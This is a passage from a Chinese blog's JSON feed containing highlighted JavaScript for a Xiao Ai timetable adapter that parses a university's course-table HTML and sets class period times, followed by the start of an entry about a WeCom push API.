class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">scheduleHtmlParser</span>(<span class=\"params\">html</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">   * 提取课程周数</span></span><br><span class=\"line\"><span class=\"comment\">   * <span class=\"doctag\">@param</span> &#123;<span class=\"type\">string</span>&#125; str 包含周数的字符串，如`[1-9，11]`、`12，14`</span></span><br><span class=\"line\"><span class=\"comment\">   * <span class=\"doctag\">@returns</span> &#123;<span class=\"type\">Array&lt;number&gt;</span>&#125; 包含`str`中所有周数的数组</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">getWeeks</span>(<span class=\"params\">str</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> weeks = [];</span><br><span class=\"line\">    str = str.<span class=\"title function_\">split</span>(<span class=\"string\">&quot;[&quot;</span>)[<span class=\"number\">1</span>].<span class=\"title function_\">split</span>(<span class=\"string\">&quot;]&quot;</span>)[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"keyword\">let</span> weekArray = str.<span class=\"title function_\">split</span>(<span class=\"string\">&quot;，&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i <span class=\"keyword\">in</span> weekArray) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">const</span> begin = weekArray[i].<span class=\"title function_\">split</span>(<span class=\"string\">&quot;-&quot;</span>)[<span class=\"number\">0</span>];</span><br><span class=\"line\">      <span class=\"keyword\">let</span> end = weekArray[i].<span class=\"title function_\">split</span>(<span class=\"string\">&quot;-&quot;</span>)[<span class=\"number\">1</span>];</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!end) &#123;</span><br><span class=\"line\">        end = begin;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = <span class=\"built_in\">parseInt</span>(begin); j &lt;= <span class=\"built_in\">parseInt</span>(end); j++) &#123;</span><br><span class=\"line\">        weeks.<span class=\"title function_\">push</span>(j);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> weeks;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">   * 提取课程节数</span></span><br><span class=\"line\"><span class=\"comment\">   * <span class=\"doctag\">@param</span> &#123;<span class=\"type\">string</span>&#125; str 包含节数的字符串，如`第8，9节`</span></span><br><span class=\"line\"><span class=\"comment\">   * <span class=\"doctag\">@returns</span> &#123;<span class=\"type\">Array&lt;number&gt;</span>&#125; 包含`str`中所有节数的数组</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">getSections</span>(<span class=\"params\">str</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> sections = [];</span><br><span class=\"line\">    str = <span class=\"regexp\">/第(.+?)节/g</span>.<span class=\"title function_\">exec</span>(str)[<span class=\"number\">0</span>].<span class=\"title function_\">replace</span>(<span class=\"string\">&quot;第&quot;</span>, <span class=\"string\">&quot;&quot;</span>).<span class=\"title function_\">replace</span>(<span class=\"string\">&quot;节&quot;</span>, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> sectionArray = str.<span class=\"title function_\">split</span>(<span class=\"string\">&quot;，&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i <span class=\"keyword\">in</span> sectionArray) &#123;</span><br><span class=\"line\">      sections.<span class=\"title function_\">push</span>(<span class=\"built_in\">parseInt</span>(sectionArray[i].<span class=\"title function_\">replace</span>(<span class=\"regexp\">/[^0-9]/gi</span>, <span class=\"string\">&quot;&quot;</span>)));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sections;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">   * 获取单节课程信息</span></span><br><span class=\"line\"><span class=\"comment\">   * <span class=\"doctag\">@param</span> &#123;<span class=\"type\">string</span>&#125; lessonName 课程名</span></span><br><span class=\"line\"><span class=\"comment\">   * <span class=\"doctag\">@param</span> &#123;<span class=\"type\">number</span>&#125; day 星期</span></span><br><span class=\"line\"><span class=\"comment\">   * <span class=\"doctag\">@param</span> &#123;<span class=\"type\">string</span>&#125; info 课程信息字符串</span></span><br><span class=\"line\"><span class=\"comment\">   * <span class=\"doctag\">@returns</span> &#123;<span class=\"type\">object</span>&#125; 课程信息</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">getLesson</span>(<span class=\"params\">lessonName, day, info</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> lesson = &#123; <span class=\"attr\">sections</span>: <span class=\"title function_\">getSections</span>(info), <span class=\"attr\">weeks</span>: <span class=\"title function_\">getWeeks</span>(info) &#125;;</span><br><span class=\"line\">    lesson.<span class=\"property\">name</span> = lessonName;</span><br><span class=\"line\">    lesson.<span class=\"property\">day</span> = day;</span><br><span class=\"line\">    lesson.<span class=\"property\">teacher</span> = info.<span class=\"title function_\">split</span>(<span class=\"string\">&quot;[&quot;</span>)[<span class=\"number\">0</span>].<span class=\"title function_\">replace</span>(<span class=\"regexp\">/\\s+/g</span>, <span class=\"string\">&quot;&quot;</span>); <span class=\"comment\">//去掉空格，多教师只提取第一个</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//提取教室</span></span><br><span class=\"line\">    tmp = info.<span class=\"title function_\">split</span>(<span class=\"string\">&quot;周&quot;</span>);</span><br><span class=\"line\">    lesson.<span class=\"property\">position</span> = tmp[tmp.<span class=\"property\">length</span> - <span class=\"number\">1</span>].<span class=\"title function_\">split</span>(<span class=\"string\">&quot;\\n&quot;</span>)[<span class=\"number\">0</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> lesson;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">   * 获取多节课程信息（同一课程被拆分为多节课）</span></span><br><span class=\"line\"><span class=\"comment\">   * <span class=\"doctag\">@param</span> &#123;<span class=\"type\">string</span>&#125; lessonName 课程名</span></span><br><span class=\"line\"><span class=\"comment\">   * <span class=\"doctag\">@param</span> &#123;<span class=\"type\">number</span>&#125; day 星期</span></span><br><span class=\"line\"><span class=\"comment\">   * <span class=\"doctag\">@param</span> &#123;<span class=\"type\">string</span>&#125; info1 课程信息（不含教室，第一行）</span></span><br><span class=\"line\"><span class=\"comment\">   * <span class=\"doctag\">@param</span> &#123;<span class=\"type\">string</span>&#125; info2 教室（第二行）</span></span><br><span class=\"line\"><span class=\"comment\">   * <span class=\"doctag\">@returns</span></span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">getLessons1</span>(<span class=\"params\">lessonName, day, info1, info2</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> lessons = [];</span><br><span class=\"line\">    <span class=\"keyword\">let</span> position = info2.<span class=\"title function_\">split</span>(<span class=\"string\">&quot;\\n&quot;</span>)[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"keyword\">let</span> sections = <span class=\"title function_\">getSections</span>(info2);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> allWeeks = info1.<span class=\"title function_\">split</span>(<span class=\"string\">&quot;周，&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i <span class=\"keyword\">in</span> allWeeks) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> lesson = &#123; <span class=\"attr\">sections</span>: sections, <span class=\"attr\">weeks</span>: <span class=\"title function_\">getWeeks</span>(allWeeks[i]) &#125;;</span><br><span class=\"line\">      lesson.<span class=\"property\">name</span> = lessonName;</span><br><span class=\"line\">      lesson.<span class=\"property\">day</span> = day;</span><br><span class=\"line\">      lesson.<span class=\"property\">teacher</span> = allWeeks[i].<span class=\"title function_\">split</span>(<span class=\"string\">&quot;[&quot;</span>)[<span class=\"number\">0</span>].<span class=\"title function_\">replace</span>(<span class=\"regexp\">/\\s+/g</span>, <span class=\"string\">&quot;&quot;</span>); <span class=\"comment\">//去掉空格</span></span><br><span class=\"line\">      lesson.<span class=\"property\">position</span> = position;</span><br><span class=\"line\">      lessons.<span class=\"title function_\">push</span>(lesson);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lessons;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">   * 获取多节课程信息（同一老师不同教室， 如`张老师[10-13]周机房 第1，2节，[2-9]周（五）111 第1，2节`）</span></span><br><span class=\"line\"><span class=\"comment\">   * <span class=\"doctag\">@param</span> &#123;<span class=\"type\">string</span>&#125; lessonName 课程名</span></span><br><span class=\"line\"><span class=\"comment\">   * <span class=\"doctag\">@param</span> &#123;<span class=\"type\">number</span>&#125; day 星期</span></span><br><span class=\"line\"><span class=\"comment\">   * <span class=\"doctag\">@param</span> &#123;<span class=\"type\">string</span>&#125; info 课程信息字符串</span></span><br><span class=\"line\"><span class=\"comment\">   * <span class=\"doctag\">@returns</span> &#123;<span class=\"type\">Array&lt;object&gt;</span>&#125; 课程信息</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">getLessons2</span>(<span class=\"params\">lessonName, day, info</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> lessons = [];</span><br><span class=\"line\">    <span class=\"keyword\">let</span> teacher = info.<span class=\"title function_\">split</span>(<span class=\"string\">&quot;[&quot;</span>)[<span class=\"number\">0</span>].<span class=\"title function_\">replace</span>(<span class=\"regexp\">/\\s+/g</span>, <span class=\"string\">&quot;&quot;</span>); <span class=\"comment\">//去掉空格</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> weekArray = info.<span class=\"title function_\">split</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> n = weekArray.<span class=\"property\">length</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; n - <span class=\"number\">1</span>; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> lesson = &#123;</span><br><span class=\"line\">        <span class=\"attr\">sections</span>: <span class=\"title function_\">getSections</span>(weekArray[i + <span class=\"number\">1</span>]),</span><br><span class=\"line\">        <span class=\"attr\">weeks</span>: <span class=\"title function_\">getWeeks</span>(weekArray[i]),</span><br><span class=\"line\">      &#125;;</span><br><span class=\"line\">      lesson.<span class=\"property\">name</span> = lessonName;</span><br><span class=\"line\">      lesson.<span class=\"property\">day</span> = day;</span><br><span class=\"line\">      lesson.<span class=\"property\">teacher</span> = teacher;</span><br><span class=\"line\">      lesson.<span class=\"property\">position</span> = weekArray[i].<span class=\"title function_\">split</span>(<span class=\"string\">&quot;周&quot;</span>)[<span class=\"number\">1</span>];</span><br><span class=\"line\">      lessons.<span class=\"title function_\">push</span>(lesson);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lessons;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/** 课程信息 */</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> courseInfos = [];</span><br><span class=\"line\">  <span class=\"keyword\">const</span> lines = $(<span class=\"string\">&quot;.addlist_01&quot;</span>).<span class=\"title function_\">find</span>(<span class=\"string\">&quot;tr&quot;</span>); <span class=\"comment\">// 表的所有行</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> l = <span class=\"number\">1</span>; l &lt;= <span class=\"number\">6</span>; l++) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 1-6行为课程</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> linelessons = $(lines[l]).<span class=\"title function_\">find</span>(<span class=\"string\">&quot;td&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> day = <span class=\"number\">1</span>; day &lt;= <span class=\"number\">7</span>; day++) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 1-7列为每一天</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> index = day + <span class=\"number\">1</span>; <span class=\"comment\">// 列标为天数+1</span></span><br><span class=\"line\">      <span class=\"keyword\">let</span> child = linelessons[index].<span class=\"property\">children</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (child.<span class=\"property\">data</span> !== <span class=\"string\">&quot;&amp;nbsp;&quot;</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//时间段不为空</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (child) &#123;</span><br><span class=\"line\">          <span class=\"comment\">//一个时间段可能有多个课程</span></span><br><span class=\"line\">          lessonName = child.<span class=\"property\">data</span>.<span class=\"title function_\">slice</span>(<span class=\"number\">0</span>, <span class=\"number\">49</span>); <span class=\"comment\">//课程名长度不能超过50字符</span></span><br><span class=\"line\">          <span class=\"comment\">// lessonName = child.data;</span></span><br><span class=\"line\">          child = child.<span class=\"property\">next</span>.<span class=\"property\">children</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (child.<span class=\"property\">data</span>.<span class=\"title function_\">slice</span>(-<span class=\"number\">1</span>) === <span class=\"string\">&quot;节&quot;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (child.<span class=\"property\">data</span>.<span class=\"title function_\">indexOf</span>(<span class=\"string\">&quot;，[&quot;</span>) === -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">              <span class=\"comment\">//同一教室不同老师</span></span><br><span class=\"line\">              courseInfos.<span class=\"title function_\">push</span>(<span class=\"title function_\">getLesson</span>(lessonName, day, child.<span class=\"property\">data</span>));</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">              <span class=\"comment\">//同一老师不同教室</span></span><br><span class=\"line\">              lessons = <span class=\"title function_\">getLessons2</span>(lessonName, day, child.<span class=\"property\">data</span>);</span><br><span class=\"line\">              <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i <span class=\"keyword\">in</span> lessons) &#123;</span><br><span class=\"line\">                courseInfos.<span class=\"title function_\">push</span>(lessons[i]);</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//一个时间段可能有多个课程</span></span><br><span class=\"line\">            child = child.<span class=\"property\">next</span>;</span><br><span class=\"line\">          &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//同一课程被拆分为多节课（两行）</span></span><br><span class=\"line\">            lessons = <span class=\"title function_\">getLessons1</span>(</span><br><span class=\"line\">              lessonName,</span><br><span class=\"line\">              day,</span><br><span class=\"line\">              child.<span class=\"property\">data</span>,</span><br><span class=\"line\">              child.<span class=\"property\">next</span>.<span class=\"property\">children</span>[<span class=\"number\">0</span>].<span class=\"property\">data</span></span><br><span class=\"line\">            );</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i <span class=\"keyword\">in</span> lessons) &#123;</span><br><span class=\"line\">              courseInfos.<span class=\"title function_\">push</span>(lessons[i]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//一个时间段可能有多个课程</span></span><br><span class=\"line\">            child = child.<span class=\"property\">next</span>.<span class=\"property\">children</span>[<span class=\"number\">0</span>].<span class=\"property\">next</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (child) &#123;</span><br><span class=\"line\">            child = child.<span class=\"property\">children</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> courseInfos;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></div><div class=\"tab-pane\" id=\"小爱课程表-3\"><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 时间配置函数，此为入口函数，不要改动函数名</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">scheduleTimer</span>(<span class=\"params\">&#123; providerRes, parserRes &#125; = &#123;&#125;</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">//周数，包括两周考试周，春18秋19夏9</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> totalWeek = <span class=\"number\">19</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (</span><br><span class=\"line\">    providerRes.<span class=\"title function_\">indexOf</span>(<span class=\"string\">&quot;春季学期&quot;</span>) &gt;= <span class=\"number\">0</span> &amp;&amp;</span><br><span class=\"line\">    providerRes.<span class=\"title function_\">indexOf</span>(<span class=\"string\">&quot;春季学期&quot;</span>) &lt; <span class=\"number\">150</span></span><br><span class=\"line\">  ) &#123;</span><br><span class=\"line\">    totalWeek = <span class=\"number\">18</span>;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (</span><br><span class=\"line\">    providerRes.<span class=\"title function_\">indexOf</span>(<span class=\"string\">&quot;秋季学期&quot;</span>) &gt;= <span class=\"number\">0</span> &amp;&amp;</span><br><span class=\"line\">    providerRes.<span class=\"title function_\">indexOf</span>(<span class=\"string\">&quot;秋季学期&quot;</span>) &lt; <span class=\"number\">150</span></span><br><span class=\"line\">  ) &#123;</span><br><span class=\"line\">    totalWeek = <span class=\"number\">19</span>;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    totalWeek = <span class=\"number\">9</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//课程时间</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> sections = [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">section</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">      <span class=\"attr\">startTime</span>: <span class=\"string\">&quot;08:00&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">endTime</span>: <span class=\"string\">&quot;08:45&quot;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">section</span>: <span class=\"number\">2</span>,</span><br><span class=\"line\">      <span class=\"attr\">startTime</span>: <span class=\"string\">&quot;08:50&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">endTime</span>: <span class=\"string\">&quot;09:35&quot;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">section</span>: <span class=\"number\">3</span>,</span><br><span class=\"line\">      <span class=\"attr\">startTime</span>: <span class=\"string\">&quot;09:50&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">endTime</span>: <span class=\"string\">&quot;10:35&quot;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">section</span>: <span class=\"number\">4</span>,</span><br><span class=\"line\">      <span class=\"attr\">startTime</span>: <span class=\"string\">&quot;10:40&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">endTime</span>: <span class=\"string\">&quot;11:25&quot;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">section</span>: <span class=\"number\">5</span>,</span><br><span class=\"line\">      <span class=\"attr\">startTime</span>: <span class=\"string\">&quot;11:30&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">endTime</span>: <span class=\"string\">&quot;12:15&quot;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">section</span>: <span class=\"number\">6</span>,</span><br><span class=\"line\">      <span class=\"attr\">startTime</span>: <span class=\"string\">&quot;14:00&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">endTime</span>: <span class=\"string\">&quot;14:45&quot;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">section</span>: <span class=\"number\">7</span>,</span><br><span class=\"line\">      <span class=\"attr\">startTime</span>: <span class=\"string\">&quot;14:50&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">endTime</span>: <span class=\"string\">&quot;15:35&quot;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">section</span>: <span class=\"number\">8</span>,</span><br><span class=\"line\">      <span class=\"attr\">startTime</span>: <span class=\"string\">&quot;15:50&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">endTime</span>: <span class=\"string\">&quot;16:35&quot;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">section</span>: <span class=\"number\">9</span>,</span><br><span class=\"line\">      <span class=\"attr\">startTime</span>: <span class=\"string\">&quot;16:40&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">endTime</span>: <span class=\"string\">&quot;17:25&quot;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">section</span>: <span class=\"number\">10</span>,</span><br><span class=\"line\">      <span class=\"attr\">startTime</span>: <span class=\"string\">&quot;17:30&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">endTime</span>: <span class=\"string\">&quot;18:15&quot;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">section</span>: <span class=\"number\">11</span>,</span><br><span class=\"line\">      <span class=\"attr\">startTime</span>: <span class=\"string\">&quot;19:00&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">endTime</span>: <span class=\"string\">&quot;19:45&quot;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">section</span>: <span class=\"number\">12</span>,</span><br><span class=\"line\">      <span class=\"attr\">startTime</span>: <span class=\"string\">&quot;19:50&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">endTime</span>: <span class=\"string\">&quot;20:35&quot;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">section</span>: <span class=\"number\">13</span>,</span><br><span class=\"line\">      <span class=\"attr\">startTime</span>: <span class=\"string\">&quot;20:40&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">endTime</span>: <span class=\"string\">&quot;21:25&quot;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">section</span>: <span class=\"number\">14</span>,</span><br><span class=\"line\">      <span class=\"attr\">startTime</span>: <span class=\"string\">&quot;21:30&quot;</span>,</span><br><span class=\"line\">      <span class=\"attr\">endTime</span>: <span class=\"string\">&quot;22:15&quot;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">  ];</span><br><span class=\"line\">  <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">totalWeek</span>: totalWeek, <span class=\"comment\">// 总周数：[1, 30]之间的整数</span></span><br><span class=\"line\">    <span class=\"attr\">startSemester</span>: <span class=\"string\">&quot;&quot;</span>, <span class=\"comment\">// 开学时间：时间戳，13位长度字符串，推荐用代码生成</span></span><br><span class=\"line\">    <span class=\"attr\">startWithSunday</span>: <span class=\"literal\">false</span>, <span class=\"comment\">// 是否是周日为起始日，该选项为true时，会开启显示周末选项</span></span><br><span class=\"line\">    <span class=\"attr\">showWeekend</span>: <span class=\"literal\">true</span>, <span class=\"comment\">// 是否显示周末</span></span><br><span class=\"line\">    <span class=\"attr\">forenoon</span>: <span class=\"number\">5</span>, <span class=\"comment\">// 上午课程节数：[1, 10]之间的整数</span></span><br><span class=\"line\">    <span class=\"attr\">afternoon</span>: <span class=\"number\">5</span>, <span class=\"comment\">// 下午课程节数：[0, 10]之间的整数</span></span><br><span class=\"line\">    <span class=\"attr\">night</span>: <span class=\"number\">4</span>, <span class=\"comment\">// 晚间课程节数：[0, 10]之间的整数</span></span><br><span class=\"line\">    <span class=\"attr\">sections</span>: sections, <span class=\"comment\">// 课程时间表，注意：总长度要和上边配置的节数加和对齐</span></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></div></div></div>\n",
            "tags": [
                "JavaScript"
            ]
        },
        {
            "id": "https://blog.meancoder.xyz/2022/wecom-push-api/",
            "url": "https://blog.meancoder.xyz/2022/wecom-push-api/",
            "title": "利用 Vercel 搭建企业微信消息推送 API",
            "date_published": "2022-02-04T14:56:11.000Z",
